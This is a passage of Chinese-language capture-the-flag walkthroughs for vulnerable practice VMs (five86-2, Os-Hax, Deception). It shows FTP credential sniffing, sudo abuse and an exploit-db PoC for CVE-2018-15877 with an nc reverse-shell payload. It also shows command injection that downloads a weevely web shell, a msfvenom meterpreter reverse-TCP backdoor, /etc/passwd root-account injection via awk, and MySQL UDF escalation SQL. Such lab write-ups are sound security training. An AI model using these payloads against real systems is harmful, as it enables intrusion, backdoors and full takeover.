0.0 0.4 3224 2124 ? S 12:00 0:00 ftp -n 172.18.0.101000 2332 0.0 1.2 133072 6124 pts&#x2F;0 S+ 12:00 0:00 proftpd: paul - 172.18.0.1: STOR file.txtstephen 2335 0.0 0.1 6496 856 pts&#x2F;0 S+ 12:01 0:00 grep ftp 用户paul正在执行脚本ftp_upload.sh和命令ftp -n 172.18.0.10 而FTP是明文传输，可以通过监听流量来获取一些信息 查看网络接口 12345678910tcpdump -D1.br-eca3858d86bf [Up, Running]2.eth0 [Up, Running]3.vethf7d5e2c [Up, Running]4.lo [Up, Running, Loopback]5.any (Pseudo-device that captures on all interfaces) [Up, Running]6.docker0 [Up]7.nflog (Linux netfilter log (NFLOG) interface) [none]8.nfqueue (Linux netfilter queue (NFQUEUE) interface) [none] 监听流量一分钟 timeout 60 tcpdump -i vethf7d5e2c -w /tmp/cap.pcap 查看流量 123456789tcpdump -r &#x2F;tmp&#x2F;cap.pcap12:12:05.337100 IP 172.18.0.10.ftp &gt; five86-2.42120: Flags [P.], seq 1:58, ack 1, win 1019, options [nop,nop,TS val 1753001473 ecr 956298429], length 57: FTP: 220 ProFTPD 1.3.5e Server (Debian) [::ffff:172.18.0.10]12:12:05.337126 IP five86-2.42120 &gt; 172.18.0.10.ftp: Flags [.], ack 58, win 1004, options [nop,nop,TS val 956302705 ecr 1753001473], length 012:12:05.337305 IP five86-2.42120 &gt; 172.18.0.10.ftp: Flags [P.], seq 1:12, ack 58, win 1004, options [nop,nop,TS val 956302705 ecr 1753001473], length 11: FTP: USER paul12:12:05.337311 IP 172.18.0.10.ftp &gt; five86-2.42120: Flags [.], ack 12, win 1019, options [nop,nop,TS val 1753001473 ecr 956302705], length 012:12:05.337522 IP 172.18.0.10.ftp &gt; five86-2.42120: Flags [P.], seq 58:90, ack 12, win 1019, options [nop,nop,TS val 1753001473 ecr 956302705], length 32: FTP: 331 Password required for paul12:12:05.337610 IP five86-2.42120 &gt; 172.18.0.10.ftp: Flags [.], ack 90, win 1004, options [nop,nop,TS val 956302705 ecr 1753001473], length 012:12:05.337627 IP five86-2.42120 &gt; 172.18.0.10.ftp: Flags [P.], seq 12:33, ack 90, win 1004, options [nop,nop,TS val 956302705 ecr 1753001473], length 21: FTP: PASS esomepasswford 得到账户paul:esomepasswford 切换至账户paul 12su paulesomepasswford 查看sudo权限 12345678sudo -lMatching Defaults entries for paul on five86-2: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin\\:&#x2F;snap&#x2F;binUser paul may run the following commands on five86-2: (peter) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;service 可以以用户peter的权限去执行/usr/sbin/service 即可以通过该命令切换至账户peter sudo -u peter /usr/sbin/service ../../bin/bash 查看该用户sudo权限 123456789sudo -lMatching Defaults entries for peter on five86-2: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin\\:&#x2F;snap&#x2F;binUser peter may run the following commands on five86-2: (ALL : ALL) ALL (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;passwd 即可用passwd命令修改root账户的密码 123sudo -u root passwd roothackforfunhackforfun 切换至root账户 1234su roothackforfunid uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) HTTP爆破 我在自己尝试了弱口令字典失败后再想了一下别的方向，无果后去看其他大神的WP，发现需要用rockyou.txt，本地测试跑完这个字典需要数十个小时 这一步的话可能换一个简单点的口令或者放一个LFI漏洞去读passwd然后爆破hash就更恰当点 FTP流量劫持 做到流量劫持这一步整个人完全懵了，没想到是怎么看出来后台有FTP传输任务，顺着其他大神的思路打通之后浏览了下那个脚本 12345678910111213141516cat ftp_upload.sh#!&#x2F;bin&#x2F;shHOST&#x3D;&#39;172.18.0.10&#39;USER&#x3D;&#39;paul&#39;PASSWD&#x3D;&#39;esomepasswford&#39;FILE&#x3D;&#39;file.txt&#39;ftp -n $HOST &lt;&lt;END_SCRIPTquote USER $USERquote PASS $PASSWDbinaryput $FILEquitEND_SCRIPTexit 0 大意应该是持续用ftp命令上传文件file.txt 所以在用命令ps -aux | grep ftp是会看到paul在执行ftp -n 172.18.0.10 为什么是网络接口vethf7d5e2c而不是br-eca3858d86bf 本地操作时接口br-eca3858d86bf的ip是172.18.0.1，而vethf7d5e2c没有ipv4地址 实际操作时只能尝试监听所有可能的网卡 capabilities 关于linux特权 在系统的角度检测非root用户进行特权操作时，该命令所需的权限与被赋予的权限是否相符 getcap -r / 2&gt;/dev/null 参考资料 capabilities capabilities manual page WP Os-Hax 2020/03/17 20:53:03 端口扫描 nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.36 12345678910111213141516171819202122232425Nmap scan report for 192.168.31.36Host is up (0.00071s latency).Not shown: 65533 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 43:0e:61:74:5a:cc:e1:6b:72:39:b2:93:4e:e3:d0:81 (RSA)| 256 43:97:64:12:1d:eb:f1:e9:8c:d1:41:6d:ed:a4:5e:9c (ECDSA)|_ 256 e6:3a:13:8a:77:84:be:08:57:d2:36:8a:18:c9:09:d6 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-favicon: Unknown favicon MD5: 5ECF6AFD7D00CCBE6B3C7AA8FD31BDE8| http-methods: |_ Supported Methods: POST OPTIONS GET HEAD|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)|_http-title: Hacker_JamesMAC Address: 08:00:27:0D:02:21 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Uptime guess: 0.070 days (since Tue Mar 17 06:51:52 2020)Network Distance: 1 hopTCP Sequence Prediction: Difficulty&#x3D;262 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel Web路径枚举 尝试爆破80端口下的Web路径 dirb http://192.168.31.36/ -w 12345678---- Scanning URL: http:&#x2F;&#x2F;192.168.31.36&#x2F; ----&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;css&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;html&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;img&#x2F; + http:&#x2F;&#x2F;192.168.31.36&#x2F;index.html (CODE:200|SIZE:3135) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;js&#x2F; + http:&#x2F;&#x2F;192.168.31.36&#x2F;server-status (CODE:403|SIZE:278) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;wordpress&#x2F; 漏洞利用 枚举wordpress账户的用户名 1234567wpscan --url http:&#x2F;&#x2F;192.168.31.36&#x2F;wordpress&#x2F; -e u[i] User(s) Identified:[+] web | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) 尝试爆破弱口令，失败 浏览静态文件时发现图片文件/img/flaghost.png 图片本身并没有有效信息 下载至本地，用LSB隐写检测程序zsteg检测图片 12zsteg flaghost.png meta Make .. text: &quot;passw@45&quot; 得到字符串passw@45 这里尝试过用这个字符串作为密码来登入wordpress和ssh服务，但都失败 尝试后发现路径/passw@45/ 该路径下存在文本flag2.txt 12345i+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ +++++ +++++ +++++ .&lt;+++ +[-&gt;- ---&lt;]&gt;--.- --.&lt;+ +++++ [-&gt;-- ----&lt; ]&gt;--- -.&lt;++ +[-&gt;+ ++&lt;]&gt; +++++ .&lt;+++ ++[-&gt;+++++ &lt;]&gt;.+ +.+++ +++++ .---- --.&lt;+ ++[-&gt; +++&lt;] &gt;++++ .&lt;+++ ++++[ -&gt;-------&lt; ]&gt;-.&lt; +++[- &gt;---&lt; ]&gt;--- .+.-- --.++ +.&lt; brainfuck编码 https://www.splitbrain.org/services/ook 在这个链接解码后得到账户 web:Hacker@4514 这个账户可以用于登入wordpress服务，也可以登入ssh服务 这里赘述一下wordpress的渗透思路 登入wordpress之后在Plugins面板看到Plainview Activity Monitor 搜索相关漏洞 12345678searchsploit Plainview Activity Monitor----------------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;)----------------------------------------------------------------------------------------- ----------------------------------------WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection | exploits&#x2F;php&#x2F;webapps&#x2F;45274.html----------------------------------------------------------------------------------------- ----------------------------------------Shellcodes: No Result 阅读相关文档 12345678910111213141516171819202122cat &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;45274.htmlPoC:--&gt;&lt;html&gt; &lt;!-- Wordpress Plainview Activity Monitor RCE [+] Version: 20161228 and possibly prior [+] Description: Combine OS Commanding and CSRF to get reverse shell [+] Author: LydA(c)ric LEFEBVRE [+] CVE-ID: CVE-2018-15877 [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well --&gt; &lt;body&gt; &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;&#x2F;&#39;)&lt;&#x2F;script&gt; &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;localhost:8000&#x2F;wp-admin&#x2F;admin.php?page&#x3D;plainview_activity_monitor&amp;tab&#x3D;activity_tools&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt; &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;ip&quot; value&#x3D;&quot;google.fr| nc -nlvp 127.0.0.1 9999 -e &#x2F;bin&#x2F;bash&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;lookup&quot; value&#x3D;&quot;Lookup&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit request&quot; &#x2F;&gt; &lt;&#x2F;form&gt; &lt;&#x2F;body&gt; 这里则需要访问/wordpress/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools 个人尝试POC所给出的反弹Shell命令时无效，选择先上传php木马再上传meterpreter后门程序的方法 这里需要注意一点，输入框的相关代码如下 &lt;input aria-required=&quot;true&quot; class=&quot;text required validates&quot; id=&quot;plainview_sdk_pvam_form2_inputs_text_ip&quot; maxlength=&quot;15&quot; name=&quot;ip&quot; required=&quot;true&quot; size=&quot;15&quot; type=&quot;text&quot; value=&quot;&quot;&gt; maxlength会限制输入的长度，size会限制显示已输入字符的长度，使用F12适当修改即可 尝试命令注入 a.b|ls 回显得到文件列表 本地构建php后门并开启HTTP服务 12weevely generate pass shell.phppython -m SinpleHTTPServer 9900 注入下载命令 a.b|wget http://192.168.31.10:9900/shell.php 连接木马 weevely http://192.168.31.36/wordpress/wp-admin/shell.php 查看系统版本 12uname -aLinux jax 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:01:15 UTC 2019 i686 i686 i686 GNU&#x2F;Linux 构造后门程序 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9933 -f elf &gt; msf.elf MSF开启监听 12345use exploit&#x2F;multi&#x2F;handler set payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.31.10set LPORT 9933run 上传后门并执行 123file_upload msf.elf &#x2F;tmp&#x2F;msf.elfchmod +x &#x2F;tmp&#x2F;msf.elf.&#x2F;msf.elf &amp; MSF接收到shell 之后可能需要靠玩家开脑洞切换到web账户（比如看到passwd文件里存在web账户联想到密码共用） 权限提升 登入SSH服务 12345678910ssh web@192.168.31.36Hacker@4514sudo -lMatching Defaults entries for web on jax: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin\\:&#x2F;snap&#x2F;binUser web may run the following commands on jax: (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;awk 可以以root权限执行awk命令 可以用awk命令修改文件/etc/passwd 查看文件/etc/passwd 123456789101112131415161718192021222324252627282930313233cat &#x2F;etc&#x2F;passwdroot:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bashdaemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologinbin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinsys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologinsync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;syncgames:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologinman:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologinlp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologinmail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologinnews:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologinuucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologinproxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinwww-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologinbackup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologinlist:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologinirc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologingnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologinnobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologinsystemd-timesync:x:100:102:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;falsesystemd-network:x:101:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;bin&#x2F;falsesystemd-resolve:x:102:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;bin&#x2F;falsesystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;falsesyslog:x:104:108::&#x2F;home&#x2F;syslog:&#x2F;bin&#x2F;false_apt:x:105:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;falselxd:x:106:65534::&#x2F;var&#x2F;lib&#x2F;lxd&#x2F;:&#x2F;bin&#x2F;falsemessagebus:x:107:111::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;falseuuidd:x:108:112::&#x2F;run&#x2F;uuidd:&#x2F;bin&#x2F;falsednsmasq:x:109:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;bin&#x2F;falsesshd:x:110:65534::&#x2F;var&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologinmysql:x:111:117:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;falseuser-a:x:1000:1000:uname-a,,,:&#x2F;home&#x2F;uname-a:&#x2F;bin&#x2F;bashweb:x:1001:1000::&#x2F;home&#x2F;web:&#x2F;bin&#x2F;sh 构造账户信息 123openssl passwd -6 hackforfun $6$qlYFR0rRnblVOfau$jH&#x2F;WAe8jTWMJjZ8&#x2F;eO77&#x2F;JCPHwbSwu1f9LAcv54xbyEfGdTrwaSBhpDIqDRDRb.AnP9QVJg1T9fftOrZH1zsQ1echo &#39;echo &#39;test:$6$DwMIt8OMOkuT9TVw$Wf4dJhyXDSlGCvseOFVXDc2qzE53zeN.IAPBKVeuFOKIihknB.kmBwqzQnp.RlibevBoJzcDLzSlkDF7OdTIK0:0:0::&#x2F;:&#x2F;bin&#x2F;bash&#39; &gt; &#x2F;tmp&#x2F;1&#39; openssl命令需在本地运行 写入账户信息 sudo -u root awk '/web:\\/bin\\/sh/&#123;system(&quot;cat /tmp/1&quot;)&#125;' /etc/passwd &gt;&gt; /etc/passwd 切换至root 1234su testhackforfunid uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) localhost 修改文件/etc/hosts，将127.0.0.1 localhost这一行前面加上’#’，再写入IP localhost。这样就解决了点击链接时总是跳转localhost的问题。本地测试时，Chrome访问localhost还是会有问题，而Firefox可以正常访问。 awk 需要通过正则匹配到文件最后的一段字符串，再写入账户信息，否则写入过多数据。 当你收集到的信息越少的时候，需要继续挖掘的地方就越多 参考资料 awk.write Deception 2020/03/19 19:06:44 端口扫描 nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.207 12345678910111213141516171819202122Nmap scan report for 192.168.31.207Host is up (0.00040s latency).Not shown: 65533 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 9d:d0:98:da:0d:32:3d:0b:3f:42:4d:d7:93:4f:fd:60 (RSA)| 256 4c:f4:2e:24:82:cf:9c:8d:e2:0c:52:4b:2e:a5:12:d9 (ECDSA)|_ 256 a9:fb:e3:f4:ba:d6:1e:72:e7:97:25:82:87:6e:ea:01 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.29 ((Ubuntu))| http-methods: |_ Supported Methods: GET POST OPTIONS HEAD|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksMAC Address: 08:00:27:5B:20:2A (Oracle VirtualBox virtual NIC)Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)No exact OS matches for host (test conditions non-ideal).Uptime guess: 14.153 days (since Wed Mar 4 23:18:19 2020)Network Distance: 1 hopTCP Sequence Prediction: Difficulty&#x3D;263 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel Web路径枚举 dirb http://192.168.31.207 -w 12345678910---- Scanning URL: http:&#x2F;&#x2F;192.168.31.207&#x2F; ----+ http:&#x2F;&#x2F;192.168.31.207&#x2F;index.html (CODE:200|SIZE:11026) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.207&#x2F;javascript&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.207&#x2F;phpmyadmin&#x2F; + http:&#x2F;&#x2F;192.168.31.207&#x2F;server-status (CODE:403|SIZE:279) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F;---- Entering directory: http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F; ----+ http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F;index.php (CODE:301|SIZE:0) + http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F;robots.txt (CODE:200|SIZE:22) wordpres框架内的链接指向的主机为localhost，需要将文件/etc/hosts中的127.0.0.1 localhost这一行注释，再写入192.168.31.207 localhost，使用firefox即可正常访问 漏洞利用 访问/wordpress/robots.txt 1allow : &#x2F;robots.html 访问/wordpress/robots.html 分析js得知点击&quot;show quest&quot;15次之后会跳转至&quot;admindelete.html&quot; 访问/wordpress/admindelete.html 1LOL,A Noob is looking for a hint 访问/wordpress/himt.html 1Please collect all the API tokens availabe on the home page 在页面/收集到四段API Token 1234API old0 : 5F4DCC3B5AAAPI old1 : 765D61D8API old2 : 327DEBAPI new : 882CF99 整理这些API 1234567cat pass 5F4DCC3B5AA765D61D8327DEB882CF995F4DCC3B5AA765D61D8327DEB882CF99 枚举wordpress框架的用户名/插件/主题 1234567891011wpscan --url http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F; -e u ap at[i] User(s) Identified:[+] haclabs | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] yash | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) 未发现关于插件与主题的有效信息 整理得到用户名字典 123cat useryashhaclabs 将其用作口令字典来爆破wordpress登录框，失败 将其用作口令字典来爆破ssh服务 123hydea -I -L user -P pass ssh:&#x2F;&#x2F;192.168.31.207[22][ssh] host: 192.168.31.207 login: yash password: 5F4DCC3B5AA765D61D8327DEB882CF99 得到ssh服务的账户 权限提升 登入ssh服务 12ssh yash@192.168.31.2075F4DCC3B5AA765D61D8327DEB882CF99 在目录/home/yash下发现隐藏文件.systemlogs 123cat .systemlogs ssdsdsdsdsdqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklqwertyuiop1234567890qazxdswedcfrfgvbhyyhnkiollokmkijnjuyhbhytgvfrdcxdesxzsyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklzaq123456vfr4567890mnbvcde4567890yuiopasdfghjklzxcvbnmzxcvbnmasdfghjklmnbvcxzsaq234567890-098765rewsxcvbnm,lpoiuytresxcbnmkoiuytredcyuiopasdfghjklzxcvbnmzxcvbnmasdfghjk!@#$dfkdfjdkfjdf!@#$fdjferheirdfdfksdjhfsg24356789yuiopasdfghjklzxcvbnmzxcvbnmasdfghjkljdfivnd&quot;haclabs&quot;jsdskdjskdjsldsklfjlkfdgl&#x2F;dsfgkdhfgkdfgdjfhkagdhkdhgkkdzfkgdhfffgkhsfhgkdfhgkjlsfladjsflslfjlaaakjdflkaejflyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklNDmsfmbwebrm43564576nu4r50q824305485103601856035860020^&amp;*()sdjfsdflsdfaldjfleragkrjgkfdghdfhksjdhgsghkskskfskgkshkshksfhkgkrtho43euvnd,m,mnhjkjhgfdrtfghj,;poiuytgbvftyhjkllksjhgdfrteuyue&quot;A&#x3D;123456789&quot;fdsgfhndsffjladjksfjlsdfjlfghfieruyiehgkfnjuyhbvcftyu789876543wsxcvbnm,mju76543asxcferfgbnm,klokjhgbvcxsdfklsdfweri34o58uwotueagsdgjlyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklwlarqlewairp3wi4te0596q03496tiquieljkgrelrsjto5euyjgeldfhqowe5uy4seyjelsdglsoh45yeujhskehgesjhgsyuiopasdfghjklzxcvbnmzxcvbnmasdfghjkldsklflssldfjlsdfjsldfjsldfjld&quot;+A[::-1]&quot;fjlsdnvsldvnsujnhgfqwertyuioplkjhgfdsazxcvbnm,mnbvcxzasdfghjkl;poiuytrewqazxsedcvftghnklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjkldjfkdslfjsldfjsldfjlw4o32894829348293489289389 可以看到有三段内容用引号标识 123&quot;haclabs&quot;&quot;A&#x3D;123456789&quot;&quot;+A[::-1]&quot; 尝试后得出账户haclabs的密码 12su haclabshaclabs987654321 切换至账户haclabs 查看sudo权限 123456789sudo -lhaclabs987654321Matching Defaults entries for haclabs on haclabs: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin\\:&#x2F;snap&#x2F;binUser haclabs may run the following commands on haclabs: (ALL : ALL) ALL sudo提权 123sudo -iid uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),27(sudo) Mysql UDF提权 拿到yash账户后提权遇到瓶颈，上传了脚本linuxprivchecker，运行过后报告可能存在Mysql的UDF提权的可能 查阅了相关资料之后发现几个问题 需要root账户 secure_file_priv plugin_dir 可以先在wordpress的配置文件中获取账户 1234567891011121314151617181920cat &#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress&#x2F;wp-config.php&#x2F;&#x2F; ** MySQL settings - You can get this info from your web host ** &#x2F;&#x2F;&#x2F;** The name of the database for WordPress *&#x2F;define( &#39;DB_NAME&#39;, &#39;wordpress&#39; );&#x2F;** MySQL database username *&#x2F;define( &#39;DB_USER&#39;, &#39;wordpressuser&#39; );&#x2F;** MySQL database password *&#x2F;define( &#39;DB_PASSWORD&#39;, &#39;cry4moon&#39; );&#x2F;** MySQL hostname *&#x2F;define( &#39;DB_HOST&#39;, &#39;localhost&#39; );&#x2F;** Database Charset to use in creating database tables. *&#x2F;define( &#39;DB_CHARSET&#39;, &#39;utf8&#39; );&#x2F;** The Database Collate type. Don&#39;t change this if in doubt. *&#x2F;define( &#39;DB_COLLATE&#39;, &#39;&#39; ); 拿到账户之后再使用mysql客户端登入服务 mysql -h localhost -u wordpressuser -pcry4moon 再查看root账户的密码 123456789101112131415mysql&gt; select host,user,authentication_string from mysql.user;+---------------+------------------+-------------------------------------------+| host | user | authentication_string |+---------------+------------------+-------------------------------------------+| localhost | root | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC || localhost | mysql.session | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE || localhost | mysql.sys | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE || localhost | debian-sys-maint | *2A702E4018EF99C245B5DC4E753531720BDC94E0 || % | haclabs | *1565CEE976A27D283F4ECF1EC2AEE11E71C8D208 || localhost | phpmyadmin | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC || wordpressuser | wordpress | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC || localhost | wordpress | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC || localhost | wordpressuser | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC |+---------------+------------------+-------------------------------------------+9 rows in set (0.20 sec) 可以看到localhost账户的密码hash和wordpressuser的一样，即都是cry4moon 但是无法登入，测试时重新设置了密码，操作如下 123update mysql.user set authentication_string&#x3D;PASSWORD(&quot;cry4moon&quot;) where user&#x3D;&#39;root&#39;;update mysql.user set plugin&#x3D;&quot;mysql_native_password&quot;;flush privileges; 完成更改密码之后即可以root账户登入 而UDF提权则需要在插件目录写入文件，关于目录可以用以下命令查阅 1234567mysql&gt; show variables like &#39;plugin_dir&#39;;+---------------+------------------------+| Variable_name | Value |+---------------+------------------------+| plugin_dir | &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F; |+---------------+------------------------+1 row in set (0.07 sec) 即/usr/lib/mysql/plugin/ 而在写入文件时会发生错误，原因是secure_file_priv参数对于文件写入存在限制 1234567mysql&gt; SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;+------------------+-----------------------+| Variable_name | Value |+------------------+-----------------------+| secure_file_priv | &#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F; |+------------------+-----------------------+1 row in set (0.01 sec) 即只能写入目录/var/lib/mysql-files/，子目录下也不行 若该值为空，则无限制 若该值为NULL，则不可写入 提权需要将文件作为插件写入plugin_dir，但与参数secure_file_priv冲突，故写入时会报错。而参数secure_file_priv为只读参数，不能再mysql客户端中更改，只能修改mysqld.cnf，写入&quot;secure_file_priv=&quot;，并且重启mysql服务，才能继续进行UDF提权。 之后发生玄学运维，手动修改了secure_file_priv参数，权限777的路径写入文件会报错权限否认，手动移动的so文件可以载入但是不能执行命令。 123456use mysql;create table foo(line blob);insert into foo values(load_file(&#39;&#x2F;tmp&#x2F;udf.so&#39;));select * from foo into dumpfile &#39;%plugin_dir%&#x2F;udf.so&#39;;create function sys_eval returns string soname &#39;udf2.so&#39;;select sys_eval(&#39;id&#39;); linux下的so文件与windows下的dll文件在MSF中都有附带 参考资料 WP UDF UDF Mysql.pass no_name 2020/03/27 01:05:37 端口扫描 nmap -p 1-65535 -T5 -sV -A -n -v 192.168.31.196 12345678910111213141516171819202122Nmap scan report for 192.168.31.196Host is up (0.00048s latency).Not shown: 65533 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 